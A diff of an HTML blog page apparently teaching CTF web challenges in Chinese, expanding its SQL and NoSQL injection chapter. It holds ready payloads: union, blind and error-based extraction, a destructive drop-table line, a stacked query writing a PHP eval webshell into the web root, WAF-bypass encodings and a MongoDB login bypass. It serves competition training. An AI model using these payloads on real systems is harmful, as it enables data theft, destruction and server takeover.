@@ -34,7 +34,7 @@
   <meta itemprop="description" content="持续更新的CTF Web知识体系与刷题总结。">
   <meta itemprop="datePublished" content="2025-12-22T22:43:35+08:00">
   <meta itemprop="dateModified" content="2025-12-22T22:43:35+08:00">
-  <meta itemprop="wordCount" content="402">
+  <meta itemprop="wordCount" content="639">
   <meta itemprop="image" content="https://decimo.top/images/1.png">
   <meta itemprop="keywords" content="CTF,Web">
   <meta property="og:image:alt" content="[持续更新] CTF-Web Guide" />
@@ -265,7 +265,7 @@ decimo的小窝
     <h1 class="card-title post-title my-2">[持续更新] CTF-Web Guide</h1>
   </div>
   <div class="card-body"><div class="post-meta mb-3">
-  <span class="post-date me-1 mb-1" title="created on 2025-12-22 22:43:35 &#43;0800 CST.">December 22, 2025</span><span class="post-reading-time me-1 mb-1">4 min read</span><a href="/categories/guide/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
+  <span class="post-date me-1 mb-1" title="created on 2025-12-22 22:43:35 &#43;0800 CST.">December 22, 2025</span><span class="post-reading-time me-1 mb-1">6 min read</span><a href="/categories/guide/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
       <i class="fas fa-fw fa-folder me-1"></i>Guide</a><a href="/tags/ctf/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">CTF</a><a href="/tags/web/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">Web</a>
 </div>
 
@@ -313,7 +313,7 @@ decimo的小窝
 <li><strong>浏览器插件</strong>：<strong>HackBar</strong>（快速发包）、Wappalyzer（指纹识别）</li>
 <li><strong>Linux环境</strong>：<strong>VMware</strong>（测试病毒)、WSL2（用于快速启动Linux环境）</li>
 <li><strong>远程控制</strong>：<strong>Antsword</strong>（连接木马），冰蝎，哥斯拉</li>
-<li><strong>IDE</strong>：<strong>PhpStorm</strong>（做php反序列化），<strong>VScode</strong></li>
+<li><strong>IDE</strong>：<strong>PhpStorm</strong>（做php反序列化），<strong>VScode</strong>（泛用）</li>
 <li><strong>自动注入</strong>：<strong>SQLmap</strong>（sql注入点自动查找），<strong>fenjing</strong>（焚靖|自动构建SSTIpayload，绕过waf一把梭）</li>
 <li><strong>AI助手</strong>：帮你想思路，构建payload和脚本</li>
 </ul>
@@ -438,34 +438,240 @@ Disallow: /hidden/flag.txt
 </ol>
 
 <h2 id="第三章核心漏洞---注入篇-injection-attacks" data-numberify>第三章：核心漏洞 - 注入篇 (Injection Attacks)<a class="anchor ms-1" href="#第三章核心漏洞---注入篇-injection-attacks"></a></h2>
+<blockquote>
 <p><em>CTF Web 的半壁江山。</em></p>
+</blockquote>
+
+<h3 id="sql-注入-sqli" data-numberify>SQL 注入 (SQLi)：<a class="anchor ms-1" href="#sql-注入-sqli"></a></h3>
+<blockquote>
+<ul>
+<li>
+<p>基础：Union 注入, Boolean 盲注, Time 盲注。</p>
+</li>
+<li>
+<p>进阶：报错注入, 堆叠注入 (Stacked Queries)。</p>
+</li>
+<li>
+<p>技巧：WAF 绕过 (空格变体、编码绕过), NoSQL 注入 (MongoDB)。</p>
+</li>
+</ul>
+</blockquote>
+<p><strong>在CTF中遇到SQL注入，先问自己三个问题：</strong></p>
 <ol>
-<li>SQL 注入 (SQLi)：
+<li><strong>注入点在哪？</strong>（确定注入点：GET/POST/Cookie/User-Agent）</li>
+<li><strong>数据库在干嘛？</strong>（判断类型：数字型/字符型/JSON型）
+3. <strong>结果怎么看？</strong>（决定手法：有回显用Union，无回显用盲注）</li>
+</ol>
+
+<h4 id="1-基础部分" data-numberify>1. 基础部分<a class="anchor ms-1" href="#1-基础部分"></a></h4>
+
+<h5 id="union-注入" data-numberify>Union 注入<a class="anchor ms-1" href="#union-注入"></a></h5>
+<p><strong>适用场景</strong>：页面有<strong>明确的数据回显位置</strong>（如表格、用户名列表）。<em>注意字段数对齐</em>
+<strong>核心步骤</strong>：</p>
+<ol>
+<li><code>order by n</code> 猜列数（直到报错或页面异常）。</li>
+<li><code>union select 1,2,3...</code> 查看回显位（哪个数字出现在页面关键位置）。</li>
+<li>在回显位替换为 <code>database()</code> / <code>group_concat(table_name)</code>。</li>
+</ol>
 <ul>
-<li>基础：Union 注入, Boolean 盲注, Time 盲注。</li>
-<li>进阶：报错注入, 堆叠注入 (Stacked Queries)。</li>
-<li>技巧：WAF 绕过 (空格变体、编码绕过), NoSQL 注入 (MongoDB)。</li>
+<li><strong>CTF小技巧</strong>：如果 <code>union</code> 被拦截，尝试 <code>union all</code> 或 <code>union distinct</code>；如果回显位显示不正常，检查是否是<code>显错位</code>在图片或二进制流中（需要<code>hex</code>编码）。</li>
+</ul>
+
+<h5 id="boolean-盲注" data-numberify>Boolean 盲注<a class="anchor ms-1" href="#boolean-盲注"></a></h5>
+<p>**适用场景：<strong>页面不显示数据，<strong>但会根据SQL真假返回“成功/失败”或“存在/不存在”的不同页面。</strong>
+<strong>核心逻辑：</strong><code>and ascii(substr(database(),1,1)) &gt; 100</code> —— 页面正常则继续，异常则调整ASCII码。</strong></p>
+<ul>
+<li><strong>CTF小技巧</strong>：写脚本时注意<strong>二分法</strong>（50, 75, 88&hellip;）可以大幅减少请求次数；如果页面差异不明显，注意比较<code>响应包长度(Content-Length)</code>或<code>状态码</code>，不要肉眼看。</li>
+</ul>
+
+<h5 id="time-盲注" data-numberify>Time 盲注<a class="anchor ms-1" href="#time-盲注"></a></h5>
+<p><strong>适用场景</strong>：页面完全无回显，也没有布尔状态变化（比如插入日志、报错被全局吞掉）。<strong>页面永远不变，只有响应时间变。</strong>
+<strong>核心逻辑</strong>：<code>and if(ascii(substr(database(),1,1))&gt;100, sleep(5), 0)</code></p>
+<ul>
+<li><strong>CTF小技巧</strong>：延时不要设5秒，设<code>1</code>秒或<code>2</code>秒即可，配合<code>benchmark(10000000,md5('a'))</code>有时更稳定；写多线程脚本时注意<strong>超时时间</strong>设置比延时稍长。</li>
+</ul>
+
+<h4 id="2-进阶部分" data-numberify>2. 进阶部分<a class="anchor ms-1" href="#2-进阶部分"></a></h4>
+
+<h5 id="报错注入" data-numberify>报错注入<a class="anchor ms-1" href="#报错注入"></a></h5>
+<p><strong>适用场景</strong>：页面开启了数据库错误回显（Error-based），但<code>union</code>被限制或不支持。
+<strong>常用Payload</strong>：</p>
+<ul>
+<li><code>updatexml(1, concat(0x7e, user(), 0x7e), 1)</code> —— MySQL 5.1+</li>
+<li><code>extractvalue(1, concat(0x7e, version()))</code>
+<strong>CTF避坑</strong>：报错注入有长度限制（最长32位），<strong>大量数据</strong>请配合<code>substr</code>分段截取，或改用<code>group_concat</code>先聚合再分段。</li>
+</ul>
+
+<h5 id="堆叠注入-stacked-queries" data-numberify>堆叠注入 (Stacked Queries)<a class="anchor ms-1" href="#堆叠注入-stacked-queries"></a></h5>
+<p><strong>适用场景</strong>：<code>mysqli_multi_query()</code> 或 PDO 允许多语句执行（CTF中常见于强网杯、HCTF）。
+<strong>CTF核心玩法</strong>：它不用于“查数据”，而是用于**“改数据”<strong>或</strong>“写文件”**。</p>
+<ul>
+<li>
+<p><code>; drop table flag -- -</code> （破坏性，慎用）</p>
+</li>
+<li>
+<p><code>; set @sql=...; prepare ...; execute ...;</code> （预编译绕过过滤）</p>
+</li>
+<li>
+<p><code>; select '&lt;?php eval($_POST[1])?&gt;' into outfile '/var/www/shell.php'</code> （需知路径）</p>
+</li>
+<li>
+<p><strong>关键提示</strong>：必须提醒读者——<strong>堆叠注入在CTF中90%用于getshell或UDF提权</strong>，而不是查表内容。</p>
+</li>
+</ul>
+<hr>
+
+<h4 id="3-技巧部分重点写waf绕过的底层逻辑" data-numberify>3. 技巧部分（重点写“WAF绕过的底层逻辑”）<a class="anchor ms-1" href="#3-技巧部分重点写waf绕过的底层逻辑"></a></h4>
+
+<h5 id="waf-绕过空格变体编码绕过" data-numberify>WAF 绕过（空格变体、编码绕过）<a class="anchor ms-1" href="#waf-绕过空格变体编码绕过"></a></h5>
+<ol>
+<li><strong>空格绕过</strong>（当<code>空格</code>被过滤）：
+<ul>
+<li><code>/**/</code> （内联注释）</li>
+<li><code>%0a</code> （换行）、<code>%0c</code> （换页）</li>
+<li><code>括号()</code> 包裹：<code>select(id)from(users)</code></li>
 </ul>
 </li>
-<li>命令执行 (RCE/Command Injection)：
+<li><strong>关键字绕过</strong>（当<code>select/union</code>被过滤）：
 <ul>
-<li>常见触发函数 (system, exec, etc.)。</li>
-<li>无回显 RCE (DNSLog 外带)。</li>
-<li>字符限制绕过 (利用通配符、环境变量拼凑命令)。</li>
+<li>大小写：<code>SeLeCt</code></li>
+<li>内联注释：<code>/*!50000union*/</code></li>
+<li>双写：<code>ununionion</code> （针对替换为空的情况）</li>
 </ul>
 </li>
-<li>代码执行 (Code Execution)：
+<li><strong>编码绕过</strong>（当WAF做正则匹配时）：
+<ul>
+<li>URL双重编码：<code>%2527</code></li>
+<li>Unicode：<code>%EF%BC%87</code> （全角引号，部分数据库支持）</li>
+<li>Hex编码：<code>0x61646d696e</code> 替代 <code>'admin'</code></li>
+</ul>
+</li>
+</ol>
+
+<h5 id="nosql-注入-mongodb" data-numberify>NoSQL 注入 (MongoDB)<a class="anchor ms-1" href="#nosql-注入-mongodb"></a></h5>
+<p>NoSQL的语法和SQL完全不一样。这里用大多数情况下的MongoDB举例</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">对比维度</th>
+          <th style="text-align: left"><strong>SQL注入 (SQLi)</strong></th>
+          <th style="text-align: left"><strong>NoSQL注入 (MongoDB)</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>目标数据库</strong></td>
+          <td style="text-align: left">关系型（MySQL/Oracle等）</td>
+          <td style="text-align: left">非关系型（MongoDB等）</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>注入语法</strong></td>
+          <td style="text-align: left">拼接 <code>SELECT</code>、<code>UNION</code>、<code>OR 1=1</code></td>
+          <td style="text-align: left">注入 <code>$ne</code>、<code>$gt</code>、<code>$where</code>、数组语法</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>攻击载体</strong></td>
+          <td style="text-align: left">字符串拼接</td>
+          <td style="text-align: left">JSON结构或操作符污染</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>利用难度</strong></td>
+          <td style="text-align: left">工具成熟（sqlmap）</td>
+          <td style="text-align: left">需手工构造，无统一自动化工具</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>典型后果</strong></td>
+          <td style="text-align: left">数据泄露、写Shell、提权</td>
+          <td style="text-align: left">数据泄露、绕过认证、执行JS（若启用）</td>
+      </tr>
+  </tbody>
+</table>
+<p>什么是关系型和非关系型呢？</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">维度</th>
+          <th style="text-align: left"><strong>关系型（MySQL）</strong></th>
+          <th style="text-align: left"><strong>非关系型（MongoDB）</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>存储逻辑</strong></td>
+          <td style="text-align: left">像<strong>Excel多个工作表</strong>，用公式（外键）串起来</td>
+          <td style="text-align: left">像<strong>Word文档</strong>，把一件事从头到尾写在一个段落里</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>数据一致性</strong></td>
+          <td style="text-align: left"><strong>强一致</strong>。改地址只改一处，全局生效</td>
+          <td style="text-align: left"><strong>可能有冗余</strong>。如果每个订单文档都单独存地址，改地址要改N处</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>查询方式</strong></td>
+          <td style="text-align: left">多表<strong>联查（JOIN）</strong>：<code>用户表 JOIN 订单表 ON...</code></td>
+          <td style="text-align: left">查<strong>一个文档</strong>就拿到所有信息，无需联查</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>适合场景</strong></td>
+          <td style="text-align: left"><strong>金融、ERP、账务</strong>（钱和数字绝对不能乱，必须强约束）</td>
+          <td style="text-align: left"><strong>社交动态、商品详情页、日志</strong>（数据结构多变，允许偶尔不一致）</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>关系型（SQL）</strong>：信奉 <strong>“数据完整性至上”</strong>。设计数据库先画ER图（实体关系图），把复杂的数据拆成最小原子，用“关系”约束它们。优点是<strong>精准、节省空间</strong>，缺点是<strong>慢</strong>（因为查个数据可能要关联5张表）。</p>
+<p><strong>非关系型（NoSQL）</strong>：信奉 <strong>“开发效率至上”</strong>。互联网时代数据格式千变万化（比如今天加个标签，明天加个评论），每次都去改表结构太痛苦。不如直接把整个对象存成JSON，<strong>用空间换时间</strong>，查询极快（因为一次就读出来了），缺点是有数据冗余。</p>
+<p><strong>CTF中的NoSQL注入</strong> 常出现在Node.js或PHP的MongoDB环境中。
+<strong>核心差异</strong>：不再是<code>' or 1=1 --</code>，而是破坏JSON结构。
+<strong>经典Payload</strong>：</p>
+<ul>
+<li>参数传：<code>username[$ne]=null&amp;password[$ne]=null</code> （$ne 不等于，绕过登录）</li>
+<li>传JSON体：<code>{&quot;username&quot;: {&quot;$regex&quot;: &quot;^admin&quot;}}</code> （正则盲注）
+<strong>CTF技巧</strong>：注意<code>$where</code>函数，如果题目允许JavaScript执行，可以用<code>$where: &quot;function(){return this.username=='admin' &amp;&amp; sleep(10000)}&quot;</code>进行时间盲注。</li>
+</ul>
+<p>伪代码流程图：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#960050;background-color:#1e0010">页面有数据回显</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#960050;background-color:#1e0010">能正常使用</span> <span style="color:#66d9ef">union</span><span style="color:#960050;background-color:#1e0010">) -</span><span style="color:#f92672">&gt;</span> Union注入;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#f92672">-&gt;</span> <span style="color:#960050;background-color:#1e0010">报错注入</span>;
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (<span style="color:#960050;background-color:#1e0010">页面有真</span><span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">假状态</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-&gt;</span> Boolean盲注;
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-&gt;</span> Time盲注;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#960050;background-color:#1e0010">分号</span>; <span style="color:#960050;background-color:#1e0010">能执行多条</span>SQL) {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-&gt;</span> <span style="color:#960050;background-color:#1e0010">优先考虑堆叠写入文件</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#960050;background-color:#1e0010">遇到</span>WAF拦截) {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-&gt;</span> <span style="color:#960050;background-color:#1e0010">先试注释符</span><span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">大小写，再试编码，最后试</span>HTTP参数污染(HPP);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#960050;background-color:#1e0010">参数是</span>JSON格式) {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-&gt;</span> <span style="color:#960050;background-color:#1e0010">切换到</span>NoSQL注入思维;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+<h3 id="命令执行-rcecommand-injection" data-numberify>命令执行 (RCE/Command Injection)：<a class="anchor ms-1" href="#命令执行-rcecommand-injection"></a></h3>
+<ul>
+<li>
+<p>常见触发函数 (system, exec, etc.)。</p>
+</li>
+<li>
+<p>无回显 RCE (DNSLog 外带)。</p>
+</li>
+<li>
+<p>字符限制绕过 (利用通配符、环境变量拼凑命令)。</p>
+<ol>
+<li>代码执行 (Code Execution)：</li>
+</ol>
 <ul>
 <li><code>eval()</code>, <code>assert()</code> 的滥用。</li>
 </ul>
-</li>
-<li>模板注入 (SSTI)：
+<ol start="2">
+<li>模板注入 (SSTI)：</li>
+</ol>
 <ul>
 <li>Python (Jinja2, Flask), PHP (Smarty), Java (Thymeleaf)。</li>
 <li>利用链构造与沙箱逃逸。</li>
 </ul>
 </li>
-</ol>
+</ul>
 
 <h2 id="第四章核心漏洞---文件操作篇-file-operations" data-numberify>第四章：核心漏洞 - 文件操作篇 (File Operations)<a class="anchor ms-1" href="#第四章核心漏洞---文件操作篇-file-operations"></a></h2>
 <ol>
@@ -1008,7 +1214,34 @@ Disallow: /hidden/flag.txt
         </li>
       </ul>
     </li>
-    <li><a href="#第三章核心漏洞---注入篇-injection-attacks">第三章：核心漏洞 - 注入篇 (Injection Attacks)</a></li>
+    <li><a href="#第三章核心漏洞---注入篇-injection-attacks">第三章：核心漏洞 - 注入篇 (Injection Attacks)</a>
+      <ul>
+        <li><a href="#sql-注入-sqli">SQL 注入 (SQLi)：</a>
+          <ul>
+            <li><a href="#1-基础部分">1. 基础部分</a>
+              <ul>
+                <li><a href="#union-注入">Union 注入</a></li>
+                <li><a href="#boolean-盲注">Boolean 盲注</a></li>
+                <li><a href="#time-盲注">Time 盲注</a></li>
+              </ul>
+            </li>
+            <li><a href="#2-进阶部分">2. 进阶部分</a>
+              <ul>
+                <li><a href="#报错注入">报错注入</a></li>
+                <li><a href="#堆叠注入-stacked-queries">堆叠注入 (Stacked Queries)</a></li>
+              </ul>
+            </li>
+            <li><a href="#3-技巧部分重点写waf绕过的底层逻辑">3. 技巧部分（重点写“WAF绕过的底层逻辑”）</a>
+              <ul>
+                <li><a href="#waf-绕过空格变体编码绕过">WAF 绕过（空格变体、编码绕过）</a></li>
+                <li><a href="#nosql-注入-mongodb">NoSQL 注入 (MongoDB)</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#命令执行-rcecommand-injection">命令执行 (RCE/Command Injection)：</a></li>
+      </ul>
+    </li>
     <li><a href="#第四章核心漏洞---文件操作篇-file-operations">第四章：核心漏洞 - 文件操作篇 (File Operations)</a></li>
     <li><a href="#第五章客户端与认证安全-client-side--auth">第五章：客户端与认证安全 (Client-side &amp; Auth)</a></li>
     <li><a href="#第六章语言特性与反序列化-language-specifics">第六章：语言特性与反序列化 (Language Specifics)</a></li>
